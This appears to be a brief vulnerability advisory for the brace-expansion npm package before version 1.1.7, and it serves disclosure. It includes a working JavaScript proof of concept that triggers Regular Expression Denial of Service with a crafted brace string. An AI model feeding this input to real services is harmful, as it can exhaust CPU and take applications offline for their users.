brace expansion versions before 1.1.7 are vulnerable to Regular Expression Denial of Service attacks.  A proof of concept is provided below:

```
var expand = require('brace-expansion');
expand('{,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\n}');
```

